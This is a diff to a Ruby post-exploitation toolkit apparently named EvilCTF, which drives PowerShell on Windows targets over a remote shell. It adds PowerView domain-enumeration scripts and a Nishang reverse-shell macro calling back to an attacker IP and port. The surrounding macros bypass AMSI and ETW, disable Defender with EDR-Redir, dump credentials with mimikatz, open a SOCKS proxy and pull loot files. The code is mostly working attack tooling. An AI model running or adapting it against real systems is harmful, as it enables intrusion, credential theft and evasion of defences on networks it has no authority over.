@@ -322,6 +322,83 @@ module EvilCTF::Tools
     "[+] Bypass verification complete"
   PS
 
+  POWERVIEW_ALL_PS = <<~PS
+    try {
+      $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
+      if (-not $cs.PartOfDomain) {
+        Write-Output "[!] Host is not domain joined. Skipping PowerView domain enumeration."
+        return
+      }
+
+      IEX (Get-Content "C:\Users\Public\PowerView.ps1" -Raw)
+
+      $commands = @(
+        @{ Name = 'Get-DomainUser'; Action = { Get-DomainUser -ErrorAction Stop } },
+        @{ Name = 'Get-DomainGroup'; Action = { Get-DomainGroup -ErrorAction Stop } },
+        @{ Name = 'Get-DomainComputer'; Action = { Get-DomainComputer -ErrorAction Stop } },
+        @{ Name = 'Get-DomainPolicy'; Action = { Get-DomainPolicy -ErrorAction Stop } },
+        @{ Name = 'Get-DomainTrust'; Action = { Get-DomainTrust -ErrorAction Stop } }
+      )
+
+      foreach ($command in $commands) {
+        try {
+          Write-Output "=== $($command.Name) ==="
+          & $command.Action
+        } catch {
+          Write-Output "[!] $($command.Name) failed: $($_.Exception.Message)"
+        }
+      }
+    } catch {
+      Write-Output "[!] PowerView enumeration aborted: $($_.Exception.Message)"
+    }
+  PS
+
+  DOM_ENUM_PS = <<~PS
+    try {
+      $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
+      if (-not $cs.PartOfDomain) {
+        Write-Output "[!] Host is not domain joined. Skipping dom_enum enumeration."
+        return
+      }
+
+      IEX (Get-Content "C:\Users\Public\PowerView.ps1" -Raw)
+
+      $commands = @(
+        @{ Name = 'Get-Domain'; Action = { Get-Domain -ErrorAction Stop } },
+        @{ Name = 'Get-DomainController'; Action = { Get-DomainController -ErrorAction Stop } },
+        @{ Name = 'Get-DomainUser'; Action = { Get-DomainUser -ErrorAction Stop } },
+        @{ Name = 'Get-DomainGroup'; Action = { Get-DomainGroup -ErrorAction Stop } },
+        @{ Name = 'Get-DomainComputer'; Action = { Get-DomainComputer -ErrorAction Stop } },
+        @{ Name = 'Get-DomainPolicy'; Action = { Get-DomainPolicy -ErrorAction Stop } },
+        @{ Name = 'Get-DomainGPO'; Action = { Get-DomainGPO -ErrorAction Stop } },
+        @{ Name = 'Get-DomainOU'; Action = { Get-DomainOU -ErrorAction Stop } },
+        @{ Name = 'Get-DomainTrust'; Action = { Get-DomainTrust -ErrorAction Stop } },
+        @{ Name = 'Get-ForestDomain'; Action = { Get-ForestDomain -ErrorAction Stop } },
+        @{ Name = 'Find-DomainShare'; Action = { Find-DomainShare -ErrorAction Stop } },
+        @{ Name = 'Get-DomainFileServer'; Action = { Get-DomainFileServer -ErrorAction Stop } },
+        @{ Name = 'Get-DomainForeignUser'; Action = { Get-DomainForeignUser -ErrorAction Stop } },
+        @{ Name = 'Get-DomainForeignGroupMember'; Action = { Get-DomainForeignGroupMember -ErrorAction Stop } },
+        @{ Name = 'Find-InterestingDomainAcl'; Action = { Find-InterestingDomainAcl -ErrorAction Stop } }
+      )
+
+      foreach ($command in $commands) {
+        try {
+          Write-Output "=== $($command.Name) ==="
+          & $command.Action
+        } catch {
+          Write-Output "[!] $($command.Name) failed: $($_.Exception.Message)"
+        }
+      }
+    } catch {
+      Write-Output "[!] dom_enum aborted: $($_.Exception.Message)"
+    }
+  PS
+
+  NISHANG_REV_REMOTE = 'C:\Users\Public\nishang-master\Shells\Invoke-PowerShellTcp.ps1'
+  NISHANG_REV_PS = 'IEX (Get-Content "[NishangRevRemote]" -Raw); Invoke-PowerShellTcp -Reverse -IPAddress [AttackerIP] -Port [AttackerPort]'
+  INVEIGH_REMOTE = 'C:\Users\Public\Inveigh.ps1'
+  INVEIGH_START_PS = 'IEX (Get-Content "[InveighRemote]" -Raw); Invoke-Inveigh -ConsoleOutput Y'
+
   def self.disable_defender(shell)
   # Check OS version
   os_info = shell.run('systeminfo | findstr /i "os name"').output.strip
@@ -385,7 +462,7 @@ module EvilCTF::Tools
     
     # Stage EDR-Redir on target system
     remote_edr_redir = 'C:\\Users\\Public\\EDR-Redir.exe'
-    EvilCTF::Uploader.upload_file(edr_redir_path, remote_edr_redir, shell)
+    EvilCTF::Uploader.upload_file(local_path: edr_redir_path, remote_path: remote_edr_redir, shell: shell)
     
     # Create temporary directory and run EDR-Redir to redirect Defender
     ps_cmd = <<~PS
@@ -447,12 +524,12 @@ end
         'rubeus_klist' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" klist 2>$null'],
         'bypass-etw' => [ETW_BYPASS_PS],
         'bypass-4msi' => [BYPASS_4MSI_PS],
-        'inveigh_start' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, 'IEX (Get-Content "C:\\Users\\Public\\Inveigh.ps1" -Raw); Invoke-Inveigh -ConsoleOutput Y'],
+        'inveigh_start' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, INVEIGH_START_PS],
         'socks_init' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, 'Import-Module "C:\\Users\\Public\\socks.ps1"; Invoke-SocksProxy -BindPort 1080'],
         'cred_harvest' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit 2>$null'],
-        'nishang_rev' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, 'IEX (Get-Content "C:\\Users\\Public\\nishang-master\\Shells\\Invoke-PowerShellTcp.ps1" -Raw); Invoke-PowerShellTcp -Reverse -IPAddress [AttackerIP] -Port 4444'],
-        'powerview_all' => [BYPASS_4MSI_PS, 'IEX (Get-Content "C:\\Users\\Public\\PowerView.ps1" -Raw); Get-DomainUser; Get-DomainGroup; Get-DomainComputer; Get-DomainPolicy; Get-DomainTrust'],
-        'dom_enum' => [BYPASS_4MSI_PS, 'IEX (Get-Content "C:\\Users\\Public\\PowerView.ps1" -Raw)', 'Get-Domain; Get-DomainController; Get-DomainUser; Get-DomainGroup; Get-DomainComputer; Get-DomainPolicy; Get-DomainGPO; Get-DomainOU; Get-DomainTrust; Get-ForestDomain; Find-DomainShare; Get-DomainFileServer; Get-DomainForeignUser; Get-DomainForeignGroupMember; Find-InterestingDomainAcl']
+          'nishang_rev' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, NISHANG_REV_PS],
+          'powerview_all' => [BYPASS_4MSI_PS, POWERVIEW_ALL_PS],
+          'dom_enum' => [BYPASS_4MSI_PS, DOM_ENUM_PS]
       }
     end
     def expand_alias(cmd)
@@ -462,12 +539,19 @@ end
       cmd
     end
     def expand_macro(name, shell, webhook: nil)
-      macro = @macros[name.downcase]
+      macro_name = name.downcase
+      macro = @macros[macro_name]
       return false unless macro
+
       puts "[*] Expanding macro: #{name}"
+      replacements = prepare_macro(macro_name, shell)
+      return true if replacements == false
+
+      replacements ||= {}
       macro.each do |step|
         begin
-          exec_res = EvilCTF::Execution.run(shell, step, timeout: 120)
+          resolved_step = resolve_macro_step(step, replacements)
+          exec_res = EvilCTF::Execution.run(shell, resolved_step, timeout: 120)
           puts exec_res.output.to_s.strip
           matches = EvilCTF::Tools.grep_output(exec_res.output)
           if matches.any?
@@ -476,9 +560,101 @@ end
           end
         rescue => e
           puts "[!] Macro step failed: #{e.message}"
+          return false
         end
       end
       true
+    end
+
+    def prepare_macro(name, shell)
+      case name
+      when 'nishang_rev'
+        remote_path = locate_nishang_rev_remote(shell)
+        return { 'NishangRevRemote' => remote_path } if remote_path
+
+        cleanup_partial_nishang_stage(shell)
+        return false unless EvilCTF::Tools.safe_autostage('nishang', shell, {}, nil)
+
+        remote_path = locate_nishang_rev_remote(shell)
+        return { 'NishangRevRemote' => remote_path } if remote_path
+
+        puts "[!] Nishang staging completed, but Invoke-PowerShellTcp.ps1 was not found on target"
+        return false
+      when 'inveigh_start'
+        remote_path = locate_inveigh_remote(shell)
+        return { 'InveighRemote' => remote_path } if remote_path
+
+        return false unless EvilCTF::Tools.safe_autostage('inveigh', shell, {}, nil)
+
+        remote_path = locate_inveigh_remote(shell)
+        return { 'InveighRemote' => remote_path } if remote_path
+
+        puts "[!] Inveigh staging completed, but Inveigh.ps1 was not found on target"
+        return false
+      end
+
+      {}
+    rescue => e
+      puts "[!] Macro preparation failed: #{e.message}"
+      false
+    end
+
+    def cleanup_partial_nishang_stage(shell)
+      remote_root = EvilCTF::Utils.escape_ps_string(TOOL_REGISTRY['nishang'][:recommended_remote])
+      cleanup_cmd = <<~PS
+        if (Test-Path '#{remote_root}') {
+          Remove-Item '#{remote_root}' -Recurse -Force -ErrorAction SilentlyContinue
+        }
+      PS
+      EvilCTF::Execution.run(shell, cleanup_cmd, timeout: 30)
+    rescue => e
+      puts "[!] Nishang cleanup warning: #{e.message}"
+    end
+
+    def locate_nishang_rev_remote(shell)
+      search_root = TOOL_REGISTRY['nishang'][:recommended_remote].rpartition('\\').first
+      search_root = EvilCTF::Utils.escape_ps_string(search_root)
+      locate_cmd = <<~PS
+        $match = Get-ChildItem -Path '#{search_root}' -Filter 'Invoke-PowerShellTcp.ps1' -Recurse -ErrorAction SilentlyContinue |
+          Select-Object -First 1 -ExpandProperty FullName
+        if ($match) { "FOUND::$match" } else { 'MISSING' }
+      PS
+
+      locate_res = EvilCTF::Execution.run(shell, locate_cmd, timeout: 30)
+      found_line = locate_res.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
+      found_line&.sub('FOUND::', '')&.strip
+    end
+
+    def locate_inveigh_remote(shell)
+      remote = EvilCTF::Utils.escape_ps_string(INVEIGH_REMOTE)
+      check_cmd = "if (Test-Path '#{remote}') { 'FOUND::#{remote}' } else { 'MISSING' }"
+      check_res = EvilCTF::Execution.run(shell, check_cmd, timeout: 20)
+      found_line = check_res.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
+      found_line&.sub('FOUND::', '')&.strip
+    end
+
+    def resolve_macro_step(step, replacements)
+      step.to_s.gsub(/\[(AttackerIP|AttackerPort|NishangRevRemote|InveighRemote)\]/) do
+        key = Regexp.last_match(1)
+        replacements[key] ||= prompt_macro_value(key, default: macro_placeholder_default(key))
+      end
+    end
+
+    def prompt_macro_value(key, default: nil)
+      label = key.gsub(/([a-z])([A-Z])/, '\\1 \\2')
+      prompt = default ? "#{label} [#{default}]: " : "#{label}: "
+      value = Readline.readline(prompt, true).to_s.strip
+      value = default if value.empty? && default
+      raise ArgumentError, "#{label} is required" if value.nil? || value.empty?
+
+      value
+    end
+
+    def macro_placeholder_default(key)
+      case key
+      when 'AttackerPort'
+        '4444'
+      end
     end
     def list_macros; @macros.keys.sort end
     def list_aliases; @aliases.keys.sort end
@@ -636,13 +812,10 @@ end
         extracted_file = tool[:zip_pick].split('/').last
       end
       
-      if extracted_file
-        remote_path = File.join(File.dirname(tool[:recommended_remote]), extracted_file)
-        
-        check_cmd = "if (Test-Path '#{EvilCTF::Utils.escape_ps_string(remote_path)}') { 'EXISTS' } else { 'MISSING' }"
-        result = shell.run(check_cmd)
-        if result.output.include?('EXISTS')
-          puts "[+] #{tool[:name]} already staged at #{remote_path}"
+      if extracted_file && !File.extname(extracted_file).empty?
+        located_path = self.locate_extracted_remote_path(shell, tool[:recommended_remote], extracted_file)
+        if located_path
+          puts "[+] #{tool[:name]} already staged at #{located_path}"
           return true
         end
       end
@@ -680,8 +853,8 @@ end
       
       # If it's a specific architecture-based zip pick, adjust remote path accordingly
       if adjusted_tool[:zip_pick] && !tool[:zip_pick_x64] && !tool[:zip_pick_x86]
-        # For tools like nishang that have a single zip_pick
-        zip_remote_path = tool[:recommended_remote]
+        # For archive roots like nishang, upload the archive alongside the extracted directory.
+        zip_remote_path = File.extname(tool[:recommended_remote]).empty? ? "#{tool[:recommended_remote]}.zip" : tool[:recommended_remote]
       elsif tool[:zip_pick_x64] || tool[:zip_pick_x86]
         # For architecture-specific zips, we still stage to the main path but extract appropriately
         zip_remote_path = tool[:recommended_remote]
@@ -690,14 +863,15 @@ end
       puts "[*] Staging ZIP file #{adjusted_tool[:filename]} to #{zip_remote_path}"
       
       # Upload the zip file
-      success = EvilCTF::Uploader.upload_file(local_path, zip_remote_path, shell)
+      success = EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: zip_remote_path, shell: shell)
       return false unless success
       
       # Create PowerShell extraction script
+      extract_root = tool[:recommended_remote].to_s.rpartition('\\').first
       extract_ps = <<~PS
         try {
           $zipPath = '#{EvilCTF::Utils.escape_ps_string(zip_remote_path)}'
-          $extractPath = '#{EvilCTF::Utils.escape_ps_string(File.dirname(tool[:recommended_remote]))}'
+          $extractPath = '#{EvilCTF::Utils.escape_ps_string(extract_root)}'
           
           Add-Type -AssemblyName System.IO.Compression.FileSystem
           [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
@@ -716,13 +890,22 @@ end
         puts "[+] ZIP extracted successfully on target"
         return true
       else
+        extracted_file = adjusted_tool[:zip_pick]&.split('/')&.last
+        located_path = if extracted_file && !File.extname(extracted_file).empty?
+                         self.locate_extracted_remote_path(shell, tool[:recommended_remote], extracted_file)
+                       end
+        if located_path
+          puts "[+] ZIP content already present at #{located_path}"
+          return true
+        end
+
         puts "[!] ZIP extraction failed: #{result.output}"
         return false
       end
     else
       # Original behavior for non-zip tools
       puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
-      EvilCTF::Uploader.upload_file(local_path, remote_path, shell)
+      EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: remote_path, shell: shell)
     end
   rescue => e
     puts "[!] Staging failed for #{tool_key}: #{e.message}"
@@ -755,6 +938,26 @@ end
       puts "[!] Execution failed for #{key}: #{e.message}"
       false
     end
+  end
+
+  def self.locate_extracted_remote_path(shell, recommended_remote, extracted_file)
+    return nil if extracted_file.nil? || extracted_file.empty?
+
+    search_root = recommended_remote.to_s.rpartition('\\').first
+    search_root = EvilCTF::Utils.escape_ps_string(search_root)
+    target_name = EvilCTF::Utils.escape_ps_string(extracted_file)
+    locate_cmd = <<~PS
+      $match = Get-ChildItem -Path '#{search_root}' -Filter '#{target_name}' -Recurse -ErrorAction SilentlyContinue |
+        Select-Object -First 1 -ExpandProperty FullName
+      if ($match) { "FOUND::$match" } else { 'MISSING' }
+    PS
+
+    result = shell.run(locate_cmd)
+    found_line = result.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
+    found_line&.sub('FOUND::', '')&.strip
+  rescue => e
+    puts "[!] Remote extracted-path lookup failed: #{e.message}"
+    nil
   end
   def self.list_available_tools
     puts "\n AVAILABLE TOOLS ".ljust(70, '=')
@@ -1002,7 +1205,7 @@ end
         puts f['Content']
         # Save to loot
         local_path = "loot/#{File.basename(f['Path'])}"
-        EvilCTF::Uploader.download_file(f['Path'], local_path, shell)
+        EvilCTF::Uploader.download_file(remote_path: f['Path'], local_path: local_path, shell: shell)
       end
     rescue => e
       puts "[!] Flag scan failed: #{e.message}"
